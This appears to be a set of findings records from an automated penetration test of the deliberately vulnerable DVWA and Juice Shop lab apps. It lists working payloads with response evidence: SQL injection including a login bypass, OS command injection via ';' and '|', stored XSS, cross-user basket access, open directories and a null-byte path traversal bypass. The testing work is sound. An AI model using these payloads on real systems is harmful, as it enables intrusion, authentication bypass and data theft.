findings.title: DVWA SQL Injection (id parameter, GET) [security=low]
findings.response_evidence: [security=low] TRUE payload 1' OR '1'='1 returned 5 user records with surnames: admin, Brown, Me (Hack), Picasso, Smith. FALSE payload 1' AND '1'='2 returned zero records (only 'User ID:' header with no ID/First name/Surname rows). Boolean difference confirms SQL injection.

findings.title: DVWA OS Command Injection (ip parameter) [security=low]
request_sequence: POST /vulnerabilities/exec/ form ip='127.0.0.1; whoami', Submit=Submit (dvwa_admin, security=low)
findings.response_evidence: [security=low] Response contains ping output for 127.0.0.1 (4 packets transmitted, 4 received) followed by the injected command output line 'www-data'. Confirms command execution as the web process identity.

findings.title: DVWA SQL Injection (id parameter, POST numeric) [security=medium]
findings.response_evidence: [security=medium] Page reported 'Security level set to medium' / 'Security Level: medium'. TRUE payload 1 OR 1=1 returned 5 records with surnames: admin, Brown, Me, Picasso, Smith. FALSE payload 1 AND 1=2 returned zero records (only the 'User ID:' header and the ID list 1-5 in the dropdown, with no First name/Surname rows).

findings.title: DVWA OS Command Injection (ip parameter, pipe bypass) [security=medium]
request_sequence: POST /vulnerabilities/exec/ form ip='127.0.0.1| whoami', Submit=Submit (dvwa_admin, security=medium)
findings.response_evidence: [security=medium] Response 'Security Level: medium'; output after ping-section contains 'www-data' (the injected whoami output). Pipe '|' bypasses the ';' and '&&' blacklist.

findings.title: Stored XSS in Guestbook message field (DVWA Stored XSS) [security=low]
request_sequence: POST http://dvwa/vulnerabilities/xss_s/ (dvwa_admin) body: txtName=xssver&mtxMessage=<script id="test_token">window.xss_flag=1</script>&btnSign=Sign Guestbook -> 200, new entry 'Name: xssver' stored
findings.response_evidence: Canary is exactly 50 chars and fits mtxMessage maxlength=50. POST returned 200 and the guestbook list shows 'Name: xssver' stored. Victim page load in Chromium (dvwa_admin) and browser_eval_js('window.xss_flag') returned '1' (String(window.xss_flag) = \"1\"), proving the stored <script id=\"test_token\"> executed on render. Note: the browser-rendered page text displayed 'Security Level: medium' while the HTTP session (GET /security.php) reported 'Security level is currently: low' at the same time; the submission was made while the HTTP session was at low, so the finding is recorded at low. The level discrepancy should be re-checked by the Coordinator.
findings.browser_js_evidence: browser_navigate(http://dvwa/vulnerabilities/xss_s/, dvwa_admin) -> title 'Vulnerability: Stored Cross Site Scripting (XSS)'; browser_eval_js('String(window.xss_flag)') -> {\"result\": \"1\"}

findings.title: DVWA security-level setter (security.php) – access control on security level change
request_sequence: GET http://dvwa/security.php (session dvwa_admin) -> 200; form fields security (select), seclev_submit=Submit, user_token=[REDACTED] (hidden); 'Security level is currently: low'
findings.response_evidence: The endpoint is a legitimate, documented DVWA admin control for changing the security level. No authorization bypass was demonstrated: I did not POST a level change, and no unauthenticated or cross-role change was attempted. CWE-284 is not among this run's defined behavioral verification criteria, so there is no pass/fail test to apply. Marked inconclusive; the Coordinator should decide whether an unauth/CSRF level-change test is worth the budget. Current level remains low.

findings.title: SQL Injection (numeric boolean) in DVWA /vulnerabilities/sqli/ id POST field [security=medium]
request_sequence: POST http://dvwa/security.php (security=medium, seclev_submit=Submit, user_token) -> 302; subsequent page reports 'Security level set to medium'
findings.response_evidence: [security=medium] TRUE payload id='1 OR 1=1' returned 5 seeded records: First name/Surname admin/admin, Gordon/Brown, Hack/Me, Pablo/Picasso, Bob/Smith. FALSE payload id='1 AND 1=2' returned zero records (only the 'User ID: 1 2 3 4 5' dropdown text, no 'First name:'/'Surname:' rows). Page footer shows 'Security Level: medium'. Quote-escaping is bypassed by numeric injection in the unquoted id context.

findings.title: DVWA SQL Injection via out-of-band session-input.php id (security=high)
request_sequence: GET http://dvwa/security.php (dvwa_admin) -> 'Security level is currently: high'
findings.response_evidence: [security=high] TRUE payload (id=1' OR '1'='1' #) on /vulnerabilities/sqli/ returned 5 records: 'ID: 1' OR '1'='1' # First name: admin Surname: admin', 'First name: Gordon Surname: Brown', 'First name: Hack Surname: Me', 'First name: Pablo Surname: Picasso', 'First name: Bob Surname: Smith'. FALSE payload (id=1' AND '1'='2' #) on /vulnerabilities/sqli/ returned no records (only the 'Click here to change your ID' form and no 'First name'/'Surname' rows). Page footer reports 'Security Level: high'. Note: the tool session_info field reported 'low', but the page body and security.php both state high.

findings.title: Juice Shop product-search SQL injection (q parameter): SQL error and UNION injection
findings.response_evidence: Single quote: HTTP 500 body 'Error: SQLITE_ERROR: near \"'%'\": syntax error' (benign q=apple returns 200 JSON with 2 products, so the error is query-induced). UNION payload: HTTP 200 {\"status\":\"success\",\"data\":[{\"id\":1,\"name\":2,\"description\":3,\"price\":4,\"deluxePrice\":5,\"image\":6,\"createdAt\":7,\"updatedAt\":8,\"deletedAt\":9}]} — the injected column values 2..9 are reflected in the product fields, proving attacker-controlled UNION SELECT into the products query.

findings.title: Login authentication bypass via SQL injection in email field
request_sequence: POST http://juiceshop:3000/rest/user/login (unauth) Content-Type: application/json body: {"email": "' OR 1=1--", "password": "x"}
findings.response_evidence: HTTP 200 application/json: {"authentication":{"token":"[REDACTED_JWT]","bid":1,"umail":"admin@juice-sh.op"}}. A valid authentication token was issued for the first user (admin@juice-sh.op) with an injected email and arbitrary password, bypassing authentication. Benign wrong credentials previously returned 401 'Invalid email or password.'

findings.title: Unauthenticated access to user feedback listing with author identifiers and partially masked emails
findings.response_evidence: HTTP 200 application/json without authentication: {"status":"success","data":[{"UserId":1,"id":1,"comment":"I love this shop! Best products in town! Highly recommended! (***in@juice-sh.op)",...},{"UserId":2,...,"comment":"Great shop! Awesome service! (***@juice-sh.op)"},{"UserId":3,...,"comment":"Nothing useful available here! (***der@juice-sh.op)"},{"UserId":21,...,"comment":"... (***ereum@juice-sh.op)"},{"UserId":null,...,"comment":"... (anonymous)"}] — 8 records total. Records are readable unauthenticated and expose UserId values plus partially masked author emails (only fragments like '***in@juice-sh.op'). No full email address field or unmasked address was disclosed, so the strict CWE-359 criterion (disclosure of author email addresses) is not fully met. Unauthenticated access to feedback data with user IDs is a partial exposure that the Coordinator may wish to review.

findings.title: Cross-user basket access (BOLA) on GET /rest/basket/{basketId}: acct2 reads acct1's basket 6
findings.response_evidence: Acct2 (own_basket_id=7) received HTTP 200 for basket 6: {"status":"success","data":{"id":6,"UserId":22,"Products":[{"id":1,"name":"Apple Juice (1000ml)","BasketItem":{"ProductId":1,"BasketId":6,"id":9,"quantity":3}}]}}. Acct1's own request for basket 6 returned the identical body (UserId 22, Apple Juice x3), and basket 6 is acct1's own_basket_id. Acct2 therefore read another user's basket contents (distinct seeded item Apple Juice (1000ml) qty 3). Note: acct2 also read basket 1 (UserId 1, Apple Juice x2, Orange Juice x3, Eggfruit Juice (500ml) x1), which belongs to a different user, so the BOLA is not limited to one basket.

findings.title: Unauthenticated user-feedback exposure with author identifiers and partially masked emails on GET /api/Feedbacks
findings.response_evidence: Unauthenticated request returned HTTP 200 {"status":"success","data":[...8 records...]} with no auth. Records disclose author UserId values (1, 2, 3, 21, 22-linked entries) and author emails embedded in comments, e.g. "I love this shop! ... (***in@juice-sh.op)", "Great shop! ... (***@juice-sh.op)", "Please send me the juicy chatbot NFT ... (***ereum@juice-sh.op)". Emails are partially masked (only fragments of local part and domain are shown), so this is partial rather than full email disclosure; anonymous entries have UserId null. Judgment: partial PII of feedback authors is exposed to unauthenticated users, which meets the CWE-359 criterion as stated, with the masking caveat noted.

findings.title: Cross-User Basket Access (BOLA) on GET /rest/basket/{basketId}
findings.response_evidence: Account 2 (acct2_bench@juiceshop.local, own_basket_id=7) requested Account 1's basket GET /rest/basket/6 and received HTTP 200: {"status":"success","data":{"id":6,"UserId":22,...,"Products":[{"id":1,"name":"Apple Juice (1000ml)",...,"BasketItem":{"ProductId":1,"BasketId":6,"id":9,"quantity":3}}]}}. Account 1's own session reports own_basket_id=6, so basket 6 belongs to acct1. Acct2 also retrieved basket 1 (UserId 1) containing Apple Juice x2, Orange Juice x3, Eggfruit Juice x1. Distinct seeded item disclosed: Apple Juice (1000ml) quantity 3 from acct1's basket 6.

findings.title: Missing Per-User Filtering on GET /api/BasketItems (all users' basket items exposed)
findings.response_evidence: Account 2 (own_basket_id=7) received HTTP 200 with {"status":"success","data":[...]} containing BasketItem records for BasketId 1, 2, 3, 4, 5, 6 and 7 (including {"ProductId":1,"BasketId":6,"id":9,"quantity":3}, which is Account 1's basket). Records from other users' baskets are returned without per-user filtering, so the endpoint exposes cross-user basket data.

findings.title: Open directory listing of /ftp/ exposes confidential files to unauthenticated users
findings.response_evidence: HTTP 200 text/html listing 'listing directory /ftp/' with entries: quarantine, acquisitions.md (909 B), announcement_encrypted.md, coupons_2013.md.bak, eastere.gg, encrypt.pyc, incident-support.kdbx, legal.md, package.json.bak, suspicious_errors.yml. Directory index is served without authentication.

findings.title: Confidential acquisitions memo retrievable from open /ftp/ directory
request_sequence: GET http://juiceshop:3000/ftp/ (session=unauth, Accept: text/html,application/json) -- listing shows acquisitions.md
findings.response_evidence:
Directory listing reveals acquisitions.md (909 B). Direct GET /ftp/acquisitions.md returned HTTP 200, text/markdown, body: "# Planned Acquisitions

> This document is confidential! Do not distribute!

Our company plans to acquire several competitors within the next year. This will have a significant stock market impact..." Confidential memo content disclosed without authentication.

findings.title: Poison null-byte path traversal bypass of /ftp/ backup file restriction (package.json.bak)
findings.response_evidence: Raw path: HTTP 403 with body 'Error: Only .md and .pdf files are allowed!' (fileServer.js verify). Null-byte bypass: HTTP 200, content_type application/octet-stream, body begins with the restricted package.json contents: '{ "name": "juice-shop", "version": "6.2.0-SNAPSHOT", "description": "An intentionally insecure JavaScript Web Application", ... "dependencies": {...}'. The filter was bypassed by the URL-encoded null byte followed by the allowed .md extension, and the .bak file was served.

findings.title: Exposed encryption-keys directory with browsable listing (jwt.pub, premium.key)
findings.response_evidence: HTTP 200, content_type text/html; charset=utf-8, unauthenticated. Body is a directory listing: 'listing directory /encryptionkeys/ ~ / encryptionkeys / Name Size Modified jwt.pub 248 12/19/2023 1:12:12 PM premium.key 50 12/19/2023 1:12:12 PM'. Links to /encryptionkeys/jwt.pub and /encryptionkeys/premium.key are exposed in the listing.

findings.title: Poison null-byte path traversal bypasses /ftp/ extension filter to retrieve restricted .bak file
findings.response_evidence:
Raw request: HTTP 403, body 'Error: Only .md and .pdf files are allowed!' (filter blocks .bak). Null-byte bypass: HTTP 200, content_type application/octet-stream, body begins with the restricted package.json backup: '{
  "name": "juice-shop",
  "version": "6.2.0-SNAPSHOT",
  "description": "An intentionally insecure JavaScript Web Application", ... "dependencies": {...}'. Both requests unauthenticated. The 403->200 differential with the %2500 suffix proves the extension filter was bypassed and a restricted file was served.
